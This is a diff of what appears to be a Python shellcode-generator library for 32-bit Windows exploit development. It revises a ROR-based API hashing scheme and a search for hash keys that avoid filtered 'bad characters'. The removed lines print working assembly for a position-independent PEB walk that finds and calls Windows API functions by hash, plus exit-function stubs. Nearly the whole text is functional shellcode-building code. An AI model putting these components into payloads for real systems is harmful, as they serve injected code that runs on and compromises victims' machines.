@@ -26,23 +26,26 @@ def ror(byte, count):
     return ((byte << (0x20 - count)) | (byte >> count)) & 0xFFFFFFFF
 
 
-def compute_hash(esi, key):
-    edx = ord(esi[0])
-    for eax in esi[1:]:
-        edx = ror(edx, key) + ord(eax)
-    return edx
+def compute_hash(module_name, function_name, key):
+    hash = (len(module_name) + 1) * 2
+    for c in function_name:
+        hash = ror(hash, key) + ord(c)
+    return hash
 
 
-def push_hash(function_name, key=DEFAULT_HASH_KEY):
-    hash = compute_hash(function_name, key)
+def push_hash(module_name, function_name, key=DEFAULT_HASH_KEY):
+    hash = compute_hash(module_name, function_name, key)
     return f"push  {hex(hash)};"
 
 
 def find_hash_key(function_names, bad_chars):
     for key in range(0x20):
         if not any(
-            any(c in bad_chars for c in compute_hash(f_name, key).to_bytes(4, "little"))
-            for f_name in function_names
+            any(
+                c in bad_chars
+                for c in compute_hash(m_name, f_name, key).to_bytes(4, "little")
+            )
+            for m_name, f_name in function_names
         ):
             return key
 
@@ -102,110 +105,3 @@ def push_string(input_str, bad_chars):
         code += new_code
 
     return code
-
-
-def find_and_call(key=DEFAULT_HASH_KEY):
-    return f"""
-    find_and_call_shorten:
-        jmp find_and_call_shorten_bnc   // Short jump
-
-    find_and_call_ret:
-        pop esi                         // POP the return address from the stack
-        mov   [ebp+0x4], esi            // Save find_function address for later usage
-        jmp find_and_call_end
-
-    find_and_call_shorten_bnc:
-        call find_and_call_ret          // Relative CALL with negative offset
-
-    find_and_call:
-        pushad                          // Save all registers
-        xor   ecx, ecx                  // ECX = 0
-        mov   esi,fs:[ecx+0x30]         // ESI = &(PEB) ([FS:0x30])
-        mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
-        mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder
-
-    next_module:
-        mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
-        push  esi
-
-    find_function:
-        mov   eax, [ebx+0x3C]           // Offset to PE Signature
-        mov   edi, [ebx+eax+0x78]       // Export Table Directory RVA
-        add   edi, ebx                  // Export Table Directory VMA
-        mov   ecx, [edi+0x18]           // NumberOfNames
-        mov   eax, [edi+0x20]           // AddressOfNames RVA
-        add   eax, ebx                  // AddressOfNames VMA
-        mov   [ebp-0x4], eax            // Save AddressOfNames VMA for later
-
-    find_function_loop:
-        jecxz get_next_module           // Jump to the end if ECX is 0
-        dec   ecx                       // Decrement our names counter
-        mov   eax, [ebp-0x4]            // Restore AddressOfNames VMA
-        mov   esi, [eax+ecx*0x4]        // Get the RVA of the symbol name
-        add   esi, ebx                  // Set ESI to the VMA of the current symbol name
-
-    compute_hash:
-        xor   eax, eax                  // EAX = 0
-        cdq                             // EDX = 0
-        cld                             // Clear direction
-
-    compute_hash_again:
-        lodsb                           // Load the next byte from esi into al
-        test  al, al                    // Check for NULL terminator
-        jz    compute_hash_finished     // If the ZF is set, we've hit the NULL term
-        ror   edx, {hex(key)}           // Rotate edx key bits to the right
-        add   edx, eax                  // Add the new byte to the accumulator
-        jmp   compute_hash_again        // Next iteration
-
-    compute_hash_finished:
-
-    find_function_compare:
-        cmp   edx, [esp+0x28]           // Compare the computed hash with the requested hash
-        jnz   find_function_loop        // If it doesn't match go back to find_function_loop
-        mov   edx, [edi+0x24]           // AddressOfNameOrdinals RVA
-        add   edx, ebx                  // AddressOfNameOrdinals VMA
-        mov   cx,  [edx+2*ecx]          // Extrapolate the function's ordinal
-        mov   edx, [edi+0x1c]           // AddressOfFunctions RVA
-        add   edx, ebx                  // AddressOfFunctions VMA
-        mov   eax, [edx+4*ecx]          // Get the function RVA
-        add   eax, ebx                  // Get the function VMA
-        mov   [esp+0x20], eax           // Overwrite stack version of eax from pushad
-
-    call_function:
-        pop   esi
-        popad                           // Restore registers
-        pop   ecx                       // Escape return address
-        pop   edx                       // Remove hash
-        push  ecx                       // Set return address
-        jmp   eax                       // Call found function
-
-    get_next_module:
-        pop   esi
-        mov   esi, [esi]                // ESI = InInitOrder[X].flink (next)
-        jmp next_module
-
-    find_and_call_end:
-    """
-
-
-def call_exit_func(func, hash_key):
-    if func == "TerminateProcess":
-        return f"""
-        call_terminateprocess:              // BOOL TerminateProcess([in] HANDLE hProcess, [in] UINT uExitCode);
-            xor   ecx, ecx                  // ECX = 0
-            push  ecx                       // uExitCode = 0
-            push  0xffffffff                // hProcess = 0xffffffff
-            {push_hash('TerminateProcess', hash_key)}
-            call dword ptr [ebp+0x04]       // Call TerminateProcess
-        """
-
-    elif func == "RtlExitUserThread":
-        return f"""
-        call_rtlexituserthread:             // RtlExitUserThread(dwThreadExitCode);
-            xor   ecx, ecx                  // ECX = 0
-            push  ecx                       // dwThreadExitCode = 0
-            {push_hash('RtlExitUserThread', hash_key)}
-            call dword ptr [ebp+0x04]       // Call RtlExitUserThread
-        """
-
-    return ""
